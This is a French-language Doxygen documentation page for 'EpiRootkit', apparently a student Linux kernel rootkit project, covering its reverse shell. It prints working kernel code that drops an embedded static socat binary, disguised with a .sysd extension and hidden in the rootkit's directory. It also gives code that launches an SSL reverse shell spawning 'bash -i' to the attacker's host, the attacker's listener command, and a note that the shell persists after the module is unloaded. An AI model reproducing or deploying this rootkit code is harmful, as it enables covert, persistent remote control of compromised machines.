<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: Reverse Shell</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('dd/de6/reverse.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">Reverse Shell</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><ul><ul><li class="level3"><a href="#autotoc_md107">Chargement de socat dans le module en tant que payload</a></li>
<li class="level3"><a href="#autotoc_md108">Déchargement du binaire sur la machine cible</a></li>
<li class="level3"><a href="#autotoc_md109">Exécution du reverse shell</a></li>
<li class="level3"><a href="#reverse-shell-reception">Reception de la connexion par l&#39;attaquant</a></li>
</ul>
</ul>
</ul>
</div>
<div class="textblock"><p>{#reverse-shell-doc} Dans le cadre de notre projet, nous avons implémenté un reverse shell utilisant <code>socat</code> pour établir une connexion chiffrée SSL vers le serveur d'attaque. Le choix de <code>socat</code> est motivé par sa capacité à fournir un shell interactif complet, contrairement à des outils plus simples comme <code>netcat</code> ou même simplement <code>bash</code>. Afin de pouvoir s'assurer de la présence de <code>socat</code> sur le système, nous avons intégré le binaire directement dans le rootkit, ce qui permet de le déposer dynamiquement lors du montage du rootkit. Cela demande d'avoir à disposition une version statique de <code>socat</code> embarquant aussi SSL, de dumper ce binaire dans le rootkit afin de pouvoir finalement l'utiliser pour établir le reverse shell.</p>
<h3><a class="anchor" id="autotoc_md107"></a>
Chargement de socat dans le module en tant que payload</h3>
<p>Pour charger le binaire <code>socat</code> dans le rootkit, nous utilisons un script lors de la compilation du module. Ce script extrait le binaire <code>socat</code> et le convertit en un tableau de caractères C, qui est ensuite intégré dans le code source du module.</p>
<div class="fragment"><div class="line">generate_socat_h() {</div>
<div class="line">  # if socat file does not exist, download it</div>
<div class="line">  if [ ! -f socat ]; then</div>
<div class="line">    echo &quot;socat binary not found.&quot;</div>
<div class="line">    echo &quot;Download static socat binary from github.com/ernw/static-toolbox&quot;</div>
<div class="line">    wget https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.4/socat-1.7.4.4-x86_64 -O socat</div>
<div class="line">    if [ $? -ne 0 ]; then</div>
<div class="line">      echo &quot;Failed to download socat binary.&quot;</div>
<div class="line">      exit 1</div>
<div class="line">    fi</div>
<div class="line">    echo &quot;Download complete.&quot;</div>
<div class="line">  fi</div>
<div class="line">  echo &quot;Hexdumping socat to socat.h&quot;</div>
<div class="line">  xxd -i socat &gt; include/socat.h</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line"># Check if socat.h exists</div>
<div class="line">if [ ! -f ./include/socat.h ]; then</div>
<div class="line">  echo &quot;socat.h not found, generating it...&quot;</div>
<div class="line">  generate_socat_h</div>
<div class="line">else</div>
<div class="line">  echo &quot;socat.h already exists, skipping generation.&quot;</div>
<div class="line">fi</div>
</div><!-- fragment --><p>À la suite de cela, nous obtenons finalement un fichier <code>socat.h</code> contenant le code suivant :</p>
<div class="fragment"><div class="line"><span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> <a class="code hl_namespace" href="../../d7/deb/namespacesocat.html">socat</a>[] = {</div>
<div class="line">  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,</div>
<div class="line">  <span class="comment">// ... (le reste du binaire socat)</span></div>
<div class="line">};</div>
<div class="line"><span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> socat_len = 123456; <span class="comment">// Longueur du binaire socat</span></div>
<div class="ttc" id="anamespacesocat_html"><div class="ttname"><a href="../../d7/deb/namespacesocat.html">socat</a></div><div class="ttdef"><b>Definition</b> <a href="../../dc/d0f/socat_8py_source.html#l00001">socat.py:1</a></div></div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md108"></a>
Déchargement du binaire sur la machine cible</h3>
<p>Le binaire <code>socat</code> est déposé sur la machine cible grâce à la fonction <code><a class="el" href="../../d0/dcb/epirootkit_8h.html#ab52214334a951111280d1dafed68ebeb">drop_socat_binaire(void)</a></code> :</p>
<div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d0/dcb/epirootkit_8h.html#ab52214334a951111280d1dafed68ebeb">drop_socat_binaire</a>(<span class="keywordtype">void</span>) {</div>
<div class="line">    <span class="keywordflow">if</span> (<a class="code hl_function" href="../../d9/d7f/socat_8c.html#a1df1aad637db243a384591117976dd5f">is_socat_binaire_dropped</a>()) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: socat binary already dropped\n&quot;</span>);</div>
<div class="line">        <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line">    }</div>
<div class="line"> </div>
<div class="line">    <span class="keyword">struct </span><a class="code hl_variable" href="../../d9/dea/epikeylog_8c.html#adab6074303433063cef2fbd657dcba0b">file</a> *f;</div>
<div class="line">    loff_t pos = 0;</div>
<div class="line"> </div>
<div class="line">    f = filp_open(<a class="code hl_define" href="../../db/d16/config_8h.html#af753744ebbde3de160015065612ca9ac">SOCAT_BINARY_PATH</a>, O_WRONLY | O_CREAT | O_TRUNC, 0700);</div>
<div class="line">    <span class="keywordflow">if</span> (IS_ERR(f)) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: failed to open file: %ld\n&quot;</span>, PTR_ERR(f));</div>
<div class="line">        <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">    }</div>
<div class="line"> </div>
<div class="line">    <span class="keywordtype">unsigned</span> <span class="keywordtype">int</span> written = kernel_write(f, <a class="code hl_namespace" href="../../d7/deb/namespacesocat.html">socat</a>, socat_len, &amp;pos);</div>
<div class="line">    <span class="keywordflow">if</span> (written &lt; 0) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: kernel_write failed: %u\n&quot;</span>, written);</div>
<div class="line">        filp_close(f, NULL);</div>
<div class="line">        <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">    }</div>
<div class="line">    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (written &lt; socat_len) {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;drop_socat_binaire: only %u bytes written, expected %u\n&quot;</span>, written, socat_len);</div>
<div class="line">        filp_close(f, NULL);</div>
<div class="line">        <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">    }</div>
<div class="line">    <span class="keywordflow">else</span> {</div>
<div class="line">        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;socat written successfully (%u bytes)\n&quot;</span>, written);</div>
<div class="line">    }</div>
<div class="line"> </div>
<div class="line">    filp_close(f, NULL);</div>
<div class="line"> </div>
<div class="line">    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_a28aac7cd72bc6ccb4340f7985d0d5449"><div class="ttname"><a href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a></div><div class="ttdeci">#define ERR_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00016">config.h:16</a></div></div>
<div class="ttc" id="aconfig_8h_html_a317bf780ec5da5b783e9979da34a878d"><div class="ttname"><a href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a></div><div class="ttdeci">#define DBG_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00015">config.h:15</a></div></div>
<div class="ttc" id="aconfig_8h_html_a6d58f9ac447476b4e084d7ca383f5183"><div class="ttname"><a href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a></div><div class="ttdeci">#define FAILURE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00006">config.h:6</a></div></div>
<div class="ttc" id="aconfig_8h_html_aa90cac659d18e8ef6294c7ae337f6b58"><div class="ttname"><a href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a></div><div class="ttdeci">#define SUCCESS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00005">config.h:5</a></div></div>
<div class="ttc" id="aconfig_8h_html_af753744ebbde3de160015065612ca9ac"><div class="ttname"><a href="../../db/d16/config_8h.html#af753744ebbde3de160015065612ca9ac">SOCAT_BINARY_PATH</a></div><div class="ttdeci">#define SOCAT_BINARY_PATH</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00024">config.h:24</a></div></div>
<div class="ttc" id="aepikeylog_8c_html_adab6074303433063cef2fbd657dcba0b"><div class="ttname"><a href="../../d9/dea/epikeylog_8c.html#adab6074303433063cef2fbd657dcba0b">file</a></div><div class="ttdeci">static struct dentry * file</div><div class="ttdef"><b>Definition</b> <a href="../../d9/dea/epikeylog_8c_source.html#l00145">epikeylog.c:145</a></div></div>
<div class="ttc" id="aepirootkit_8h_html_ab52214334a951111280d1dafed68ebeb"><div class="ttname"><a href="../../d0/dcb/epirootkit_8h.html#ab52214334a951111280d1dafed68ebeb">drop_socat_binaire</a></div><div class="ttdeci">int drop_socat_binaire(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d7f/socat_8c_source.html#l00032">socat.c:32</a></div></div>
<div class="ttc" id="asocat_8c_html_a1df1aad637db243a384591117976dd5f"><div class="ttname"><a href="../../d9/d7f/socat_8c.html#a1df1aad637db243a384591117976dd5f">is_socat_binaire_dropped</a></div><div class="ttdeci">static int is_socat_binaire_dropped(void)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d7f/socat_8c_source.html#l00019">socat.c:19</a></div></div>
</div><!-- fragment --><p>Cette fonction vérifie d'abord si le binaire a déjà été déposé, puis crée et écrit le contenu du tableau <code>socat</code> (contenant le binaire) à l'emplacement défini par <code>SOCAT_BINARY_PATH</code>. Elle gère également les erreurs potentielles lors de l'écriture et s'assure que l'intégralité du binaire est bien écrite sur le disque.</p>
<blockquote class="doxtable">
<p>&zwj;<b>Obfuscation et discrétion du binaire</b> Par défaut, le fichier <code>socat</code> déposé sur la machine cible est renommé avec l'extension <code>.sysd</code> afin d'ajouter une première couche d'obfuscation. De plus, il est placé dans le répertoire caché du rootkit, ce qui le rend pratiquement invisible pour un utilisateur ou un administrateur système classique. Ce choix vise à limiter les risques de détection du binaire par des outils d'analyse ou lors d'une inspection manuelle du système de fichiers. </p>
</blockquote>
<h3><a class="anchor" id="autotoc_md109"></a>
Exécution du reverse shell</h3>
<p>Pour exécuter le reverse shell, nous utilisons la fonction <code><a class="el" href="../../d0/dcb/epirootkit_8h.html#af02d46871d795eb9ab17ab2d735491ec">launch_reverse_shell(char *args)</a></code> :</p>
<div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d0/dcb/epirootkit_8h.html#af02d46871d795eb9ab17ab2d735491ec">launch_reverse_shell</a>(<span class="keywordtype">char</span> *args) {</div>
<div class="line">  <span class="keywordflow">if</span> (!<a class="code hl_function" href="../../d9/d7f/socat_8c.html#a1df1aad637db243a384591117976dd5f">is_socat_binaire_dropped</a>()) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;launch_reverse_shell: socat binary not dropped\n&quot;</span>);</div>
<div class="line">    <span class="keywordflow">return</span> -<a class="code hl_define" href="../../db/d16/config_8h.html#a6d58f9ac447476b4e084d7ca383f5183">FAILURE</a>;</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <span class="keywordtype">int</span> <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a> = <a class="code hl_define" href="../../db/d16/config_8h.html#af5e15f8236c0196237c7a7525b956778">REVERSE_SHELL_PORT</a>; <span class="comment">// Port par defaut</span></div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Recuperer le port</span></div>
<div class="line">  <span class="keywordflow">if</span> (args &amp;&amp; strlen(args) &gt; 0)</div>
<div class="line">    <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a> = simple_strtol(args, NULL, 10);</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Construire la commande socat avec le port spécifié</span></div>
<div class="line">  <span class="keywordtype">char</span> cmd[256];</div>
<div class="line">  snprintf(cmd, <span class="keyword">sizeof</span>(cmd), <span class="stringliteral">&quot;%s exec:&#39;bash -i&#39;,pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &amp;&quot;</span>,</div>
<div class="line">          <a class="code hl_define" href="../../db/d16/config_8h.html#af753744ebbde3de160015065612ca9ac">SOCAT_BINARY_PATH</a>, <a class="code hl_variable" href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a>, <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Lancer la commande</span></div>
<div class="line">  <span class="keywordtype">int</span> ret_code = <a class="code hl_define" href="../../d0/dcb/epirootkit_8h.html#a2509f715445905a8233750714bc2f515">exec_str_as_command</a>(cmd, <span class="keyword">false</span>);</div>
<div class="line"> </div>
<div class="line">  <span class="keywordflow">if</span> (ret_code &lt; 0) {</div>
<div class="line">    <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;launch_reverse_shell: failed to start reverse shell on port %d\n&quot;</span>, <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line">    <span class="keywordflow">return</span> ret_code;</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;launch_reverse_shell: reverse shell started on port %d\n&quot;</span>, <a class="code hl_variable" href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a>);</div>
<div class="line">  <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_a63c89c04d1feae07ca35558055155ffb"><div class="ttname"><a href="../../db/d16/config_8h.html#a63c89c04d1feae07ca35558055155ffb">port</a></div><div class="ttdeci">int port</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00007">main.c:7</a></div></div>
<div class="ttc" id="aconfig_8h_html_af5e15f8236c0196237c7a7525b956778"><div class="ttname"><a href="../../db/d16/config_8h.html#af5e15f8236c0196237c7a7525b956778">REVERSE_SHELL_PORT</a></div><div class="ttdeci">#define REVERSE_SHELL_PORT</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00025">config.h:25</a></div></div>
<div class="ttc" id="aconfig_8h_html_afbc356cd0e25d1dbbece7c10fd025fa6"><div class="ttname"><a href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a></div><div class="ttdeci">char * ip</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00006">main.c:6</a></div></div>
<div class="ttc" id="aepirootkit_8h_html_a2509f715445905a8233750714bc2f515"><div class="ttname"><a href="../../d0/dcb/epirootkit_8h.html#a2509f715445905a8233750714bc2f515">exec_str_as_command</a></div><div class="ttdeci">#define exec_str_as_command(user_cmd, catch_stds)</div><div class="ttdef"><b>Definition</b> <a href="../../d0/dcb/epirootkit_8h_source.html#l00037">epirootkit.h:37</a></div></div>
<div class="ttc" id="aepirootkit_8h_html_af02d46871d795eb9ab17ab2d735491ec"><div class="ttname"><a href="../../d0/dcb/epirootkit_8h.html#af02d46871d795eb9ab17ab2d735491ec">launch_reverse_shell</a></div><div class="ttdeci">int launch_reverse_shell(char *args)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d7f/socat_8c_source.html#l00083">socat.c:83</a></div></div>
</div><!-- fragment --><p>Cette fonction vérifie d'abord que le binaire <code>socat</code> a bien été déposé. Elle récupère ensuite le port à utiliser (par défaut ou passé en argument), construit la commande d'exécution du reverse shell avec <code>socat</code>, puis l'exécute via <code>exec_str_as_command</code>. Les erreurs sont gérées et un message de succès est affiché si le shell est lancé correctement.</p>
<p><b>Explication de la commande <code>socat</code> utilisée :</b> </p><div class="fragment"><div class="line">socat exec:&#39;bash -i&#39;,pty,stderr,setsid,sigint,sane openssl-connect:IP:PORT,verify=0 &amp;</div>
</div><!-- fragment --><p> Cette commande <code>socat</code> établit une connexion SSL vers l'IP et le port spécifiés, tout en redirigeant l'entrée et la sortie standard vers un shell interactif <code>bash</code>. Les options utilisées sont : </p><table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Option   </th><th class="markdownTableHeadNone">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>exec:bash -i</code>   </td><td class="markdownTableBodyNone">Exécute un shell interactif.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>pty</code>   </td><td class="markdownTableBodyNone">Alloue un pseudo-terminal pour le shell.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>stderr</code>   </td><td class="markdownTableBodyNone">Redirige les erreurs vers la sortie standard.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>setsid</code>   </td><td class="markdownTableBodyNone">Détache le processus du terminal.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>sigint</code>   </td><td class="markdownTableBodyNone">Gère les signaux d'interruption.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>sane</code>   </td><td class="markdownTableBodyNone">Réinitialise les paramètres du terminal pour un comportement standard.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>openssl-connect:IP:PORT</code>   </td><td class="markdownTableBodyNone">Établit une connexion SSL vers l'IP et le port spécifiés.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>verify=0</code>   </td><td class="markdownTableBodyNone">Désactive la vérification du certificat SSL (utile pour les tests, mais à éviter en production).   </td></tr>
</table>
<p>En somme, cette commande génère un shell sur mesure permettant ensuite d'ajouter un maximum d'interactivité et de fonctionnalités, tout en étant sécurisé par SSL.</p>
<h3><a class="anchor" id="reverse-shell-reception"></a>
Reception de la connexion par l'attaquant</h3>
<p>Pour recevoir la connexion du reverse shell, l'attaquant doit exécuter la commande suivante sur son serveur :</p>
<div class="fragment"><div class="line">socat openssl-listen:9000,reuseaddr,cert=&quot;$(pwd)&quot;/server.pem,verify=0 file:&quot;$(tty)&quot;,raw,echo=0</div>
</div><!-- fragment --><p>Explications des options utilisées : </p><table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Option   </th><th class="markdownTableHeadNone">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>openssl-listen:9000</code>   </td><td class="markdownTableBodyNone">Écoute les connexions entrantes sur le port 9000 en utilisant SSL.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>reuseaddr</code>   </td><td class="markdownTableBodyNone">Permet de réutiliser l'adresse et le port, utile pour éviter les erreurs de "port déjà utilisé".    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>cert="$(pwd)"/server.pem</code>   </td><td class="markdownTableBodyNone">Spécifie le certificat SSL à utiliser pour la connexion.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>verify=0</code>   </td><td class="markdownTableBodyNone">Désactive la vérification du certificat SSL (utile pour les tests, mais à éviter en production).    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>file:"$(tty)",raw,echo=0</code>   </td><td class="markdownTableBodyNone">Redirige l'entrée/sortie vers le terminal actuel, en mode brut et sans écho.   </td></tr>
</table>
<blockquote class="doxtable">
<p>&zwj;<b>⚠️ Attention</b> <br  />
 Le processus <code>socat</code> étant lancé dans un thread distinct du thread principal du module, il continue de s'exécuter même après le déchargement du rootkit. Cela présente l'avantage de maintenir un accès persistant à la machine cible, même si le rootkit doit être temporairement désactivé ou relancé. Cependant, il est important de garder à l'esprit que ce comportement peut laisser des traces (processus <code>socat</code> actif) et doit donc être pris en compte lors de l'utilisation ou de la suppression du module. </p>
</blockquote>
<p>Dans le cadre de notre projet, nous avons automatisé le lancement de cette commande depuis l'interface web de l'attaquant, permettant ainsi de démarrer le reverse shell en un clic.</p>
<blockquote class="doxtable">
<p>&zwj;<b>Note</b> <br  />
 Pour plus d'informations concernant le lancement côté attaquant, voir la section <a class="el" href="../../d9/dc4/md_pages_2fr_204__usage.html#reverse-shell">Dashboard</a>. </p>
</blockquote>
<p><img src="../../logo_no_text.png" alt="" style="
  display: block;
  margin: 100px auto;
  width: 30%;
  overflow: hidden;
  " class="inline"/> </p>
</div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
